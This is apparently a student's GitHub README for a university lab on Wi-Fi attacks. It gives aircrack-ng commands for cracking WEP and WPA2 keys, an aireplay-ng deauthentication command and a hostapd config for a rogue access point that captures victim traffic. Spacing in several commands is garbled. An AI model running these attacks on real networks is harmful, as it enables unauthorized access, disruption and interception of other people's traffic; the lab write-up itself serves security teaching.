# Wireless Penetration Testing: WEP/WPA2 Cracking & Rogue AP Simulation
![Status](https://img.shields.io/badge/Status-Completed-green)  
![Tech](https://img.shields.io/badge/Tools-Aircrack--ng%2C%20Wireshark%2C%20Scapy%2C%20Python%20-%20blue)  

## 📌 Overview  
This repository contains a **Wi-Fi Security project**, where I explored vulnerabilities in wireless networks, including:  
- Cracking WEP encryption  
- Cracking WPA2 encryption  
- Performing deauthentication attacks  
- Simulating rogue access points  

This project demonstrates **ethical hacking techniques** used in penetration testing for assessing and strengthening Wi-Fi security.  

---

## 📖 Table of Contents  
- [Key Topics Covered](#key-topics-covered)  
- [Files Included](#files-included)  
- [Tools & Technologies Used](#tools--technologies-used)  
- [Methodology](#methodology)  
  - [Environment Setup](#0️⃣-environment-setup)  
  - [Cracking WEP Encryption](#1️⃣-cracking-wep-encryption)  
  - [Cracking WPA2 Encryption](#2️⃣-cracking-wpa2-encryption)  
  - [Deauthentication Attack](#3️⃣-deauthentication-attack)  
  - [Rogue Access Point Attack](#4️⃣-rogue-access-point-attack)  
- [Ethical Considerations](#ethical-considerations)  
- [Learning Outcomes](#learning-outcomes)  
- [Contact](#contact)  
- [Acknowledgements](#acknowledgements)  
 

---

## Key Topics Covered  
- **Cracking WEP Encryption**: Used `aircrack-ng` to recover WEP keys by analyzing captured IVs.  
- **Breaking WPA2-PSK Encryption**: Captured WPA2 handshake and used dictionary attacks.  
- **Deauthentication Attacks**: Exploited CVE-2019-16275 to disconnect clients from a Wi-Fi network.  
- **Rogue Access Point Attack**: Set up a fake AP and captured victim traffic.  

---

## Files Included  
| File Name | Description |  
|-----------|------------|  
| `captures/*` | All the required captures to execute this attack |  
| `scripts/deauth.py` | Python script for deauthentication attack |   
| `scripts/hostapd.txt` | Configuration file for creating a rogue AP | 
| `wordlists/passwords.txt` | Wordlist used for WPA cracking |  

---

## Tools & Technologies Used  
- **Aircrack-ng Suite** (`Airmon-ng`, `Airodump-ng`, `Aircrack-ng`, `Aireplay-ng`)  
- **Wireshark** – Network packet analysis  
- **Scapy** – Packet manipulation & forging  
- **Python** – Scripting for automated attacks  
- **Linux CLI (Ubuntu VM)** – Running security tools 
- **TPLink TL-WN722N Wi-Fi Adapter** 

---

## Methodology  

### **0️⃣ Environment Setup**

```bash
sudo apt update
sudo apt install -y aircrack - ng

sudo apt install wireshark

git clone https :// github . com / secdev / scapy . git
cd scapy
sudo python3 setup . py install

sudo apt update
sudo apt upgrade
sudo apt install -y realtek - rtl8188eus - dkms
```

```bash
iwconfig # Indentify the inteface of the wifi adapter

# replace < interface > with the interface of the wifi adapter
sudo ifconfig < interface > down
sudo airmon - ng check kill
sudo iwconfig < interface > mode monitor
sudo ifconfig < interface > up
iwconfig
# This enables monitor mode 
```

---

### **1️⃣ Cracking WEP Encryption**  
- Enabled **monitor mode** using `airmon-ng`.  
- Captured packets using `airodump-ng`.  
- Used **IVs** to decrypt the key with `aircrack-ng`.  

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Capture packets
sudo airodump - ng wlan0mon -w < dump file >

# Crack WEP keykey
aircrack - ng -n 64 -b <AP_MAC_address> <dump file>. pcap
```
- Add the key in wireshark to decrypt the packets. (Edit > Preferences > Protocols > IEEE 802.11 > Decryption keys.Make sure to choose the protocol as wep.)

### **2️⃣ Cracking WPA2 Encryption**  
- Captured **4-way handshake** using `airodump-ng`.  
- Used dictionary attack with `aircrack-ng`.  

```bash
# Capture handshake
sudo airodump - ng wlan0mon -w <dump_file > -c <channel>

# Crack WPA2 password
sudo aircrack - ng -a 2 -b < AP_MAC_address > -w <word_file> <dump_file> (I used passwords.txt as the word file) 
```

### 3️⃣ Deauthentication Attack
- Used aireplay-ng to send deauthentication frames, disconnecting clients.
- Exploited CVE-2019-16275 for forced disconnection.

```bash
sudo aireplay-ng --deauth 100 -a <AP_MAC> -c <Client_MAC> wlan0mon
```

### 4️⃣ Rogue Access Point Attack
- Created a fake AP using hostapd to capture victim traffic.
- Used Wireshark to analyze captured packets.

```bash
#Create hostapd.conf and add the following lines
ctrl_interface=/var/run/hostapd
driver=nl80211
ssid=<target AP>
channel=<target channel>
hw_mode=g
ieee80211n=1
ieee80211w=2
auth_algs=< target algorithm >
wpa=< target WPA version >
wpa_key_mgmt=< target MGMT >
rsn_pairwise=< target paiwise >
wpa_passphrase=< target password >
```
```bash
sudo systemctl restart apache2
sudo hostapd hostapd.conf
```

---

## Ethical Considerations

⚠️ Disclaimer: This project was conducted in a controlled lab environment as part of an exercise in cybersecurity. Unauthorized Wi-Fi penetration testing is illegal without explicit permission. The purpose of this project was to understand security weaknesses and develop skills for ethical hacking and cybersecurity defense."

### Key ethical principles followed:

✅ Responsible Disclosure – Understanding vulnerabilities to help secure networks.
✅ No Unauthorized Testing – Experiments were performed in a controlled environment with instructor approval.
✅ Security Awareness – The findings from this project help reinforce best security practices for network protection.

## Learning Outcomes

By completing this project I gained the following skills:

✅ Hands-on experience with Wi-Fi security – Analyzed encryption flaws in WEP and WPA2.
✅ Packet Sniffing & Analysis – Used Wireshark to capture and inspect wireless traffic.
✅ Cracking Encryption Keys – Learned how dictionary attacks and IV collection work against WPA2 and WEP.
✅ Ethical Hacking Techniques – Performed deauthentication attacks and rogue AP simulations.
✅ Understanding Countermeasures – Explored network defense strategies, including WPA3, VPNs, and intrusion detection.

---

### Contact
For any inquiries, feel free to reach out via:
📌 LinkedIn: www.linkedin.com/in/pranavs07

---

### Acknowledgements
Parts of this lab were originally written by Simon Thoustrup, Sigurd Hilbert Madsen and Frej Laursen
W¨urtz. Later on, parts of these exercises were re-written/edited by Kasper Rasmussen and then edited
by Davide Zanetti, Ghassan Karame, Luka Maliˇsa, Joel Reardon and Nikos Karapanos. Addition of the
deauthentication attack, has been done by Domien Schepers, while addition of the rogue access points and
latest editing/updating of all sections has been done by Evangelos Bitsikas. This project was completed under the supervision of Dr. Aanjhan Ranganathan.